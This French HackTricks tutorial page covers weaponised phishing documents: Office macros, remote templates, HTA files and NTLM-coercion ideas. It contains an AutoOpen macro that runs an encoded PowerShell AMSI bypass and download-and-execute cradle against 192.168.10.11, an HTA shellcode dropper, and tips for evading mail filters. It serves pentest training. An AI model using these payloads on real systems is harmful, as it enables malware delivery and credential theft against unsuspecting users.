## Fichiers et documents de phishing

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Documents Office

Microsoft Word effectue une validation des données de fichier avant d'ouvrir un fichier. La validation des données est effectuée sous forme d'identification de la structure des données, conformément à la norme OfficeOpenXML. Si une erreur se produit pendant l'identification de la structure des données, le fichier analysé ne sera pas ouvert.

Généralement, les fichiers Word contenant des macros utilisent l'extension `.docm`. Cependant, il est possible de renommer le fichier en changeant l'extension de fichier et de conserver leurs capacités d'exécution de macro.\
Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera géré par Microsoft Word et sera capable d'exécuter des macros.\
Les mêmes mécanismes internes s'appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont être exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX faisant référence à un modèle distant (Fichier - Options - Compléments - Gérer: Modèles - Aller) qui inclut des macros peuvent également "exécuter" des macros.

### Chargement d'image externe

Aller à: _Insertion --> Parties rapides --> Champ_\
_**Catégories**: Liens et références, **Noms de champ**: includePicture, et **Nom de fichier ou URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### Backdoor de macros

Il est possible d'utiliser des macros pour exécuter du code arbitraire à partir du document.

#### Fonctions d'auto-chargement

Plus elles sont courantes, plus il est probable que l'AV les détecte.

* AutoOpen()
* Document\_Open()

#### Exemples de code de macros
```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Supprimer manuellement les métadonnées

Allez dans **Fichier > Informations > Inspecter le document > Inspecter le document**, ce qui fera apparaître l'Inspecteur de document. Cliquez sur **Inspecter** puis sur **Supprimer tout** à côté de **Propriétés du document et informations personnelles**.

#### Extension de fichier

Une fois terminé, sélectionnez la liste déroulante **Enregistrer sous le type**, changez le format de **`.docx`** à **Word 97-2003 `.doc`**.\
Faites cela car vous **ne pouvez pas enregistrer de macros dans un fichier `.docx`** et il y a une **stigmatisation** autour de l'extension de fichier macro activée **`.docm`** (par exemple, l'icône de vignette a un énorme `!` et certains passerelles web/e-mail les bloquent entièrement). Par conséquent, cette **extension de fichier héritée `.doc` est le meilleur compromis**.

#### Générateurs de macros malveillantes

* MacOS
  * [**macphish**](https://github.com/cldrn/macphish)
  * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Fichiers HTA

Un fichier HTA est un programme Windows propriétaire dont le **code source est constitué de HTML et d'un ou plusieurs langages de script** pris en charge par Internet Explorer (VBScript et JScript). HTML est utilisé pour générer l'interface utilisateur et le langage de script pour la logique du programme. Un **HTA s'exécute sans les contraintes du modèle de sécurité du navigateur**, il s'exécute donc en tant qu'application "entièrement approuvée".

Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, rendant **`mshta` dépendant d'IE**. Donc, s'il a été désinstallé, les HTA ne pourront pas s'exécuter.
```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
	Function var_func()
		var_shellcode = "<shellcode>"

		Dim var_obj
		Set var_obj = CreateObject("Scripting.FileSystemObject")
		Dim var_stream
		Dim var_tempdir
		Dim var_tempexe
		Dim var_basedir
		Set var_tempdir = var_obj.GetSpecialFolder(2)
		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
		var_obj.CreateFolder(var_basedir)
		var_tempexe = var_basedir & "\" & "evil.exe"
		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
		For i = 1 to Len(var_shellcode) Step 2
		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
		Next
		var_stream.Close
		Dim var_shell
		Set var_shell = CreateObject("Wscript.Shell")
		var_shell.run var_tempexe, 0, true
		var_obj.DeleteFile(var_tempexe)
		var_obj.DeleteFolder(var_basedir)
	End Function

	var_func
	self.close
</script>
```
## Forcer l'authentification NTLM

Il existe plusieurs façons de **forcer l'authentification NTLM "à distance"**, par exemple, vous pouvez ajouter des **images invisibles** aux e-mails ou HTML que l'utilisateur accédera (même HTTP MitM ?). Ou envoyer à la victime l'**adresse de fichiers** qui déclenchera une **authentification** juste pour **ouvrir le dossier**.

**Consultez ces idées et plus encore dans les pages suivantes :**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### Relais NTLM

N'oubliez pas que vous ne pouvez pas seulement voler le hash ou l'authentification, mais aussi **effectuer des attaques de relais NTLM** :

* [**Attaques de relais NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (relais NTLM vers les certificats)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au repo [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
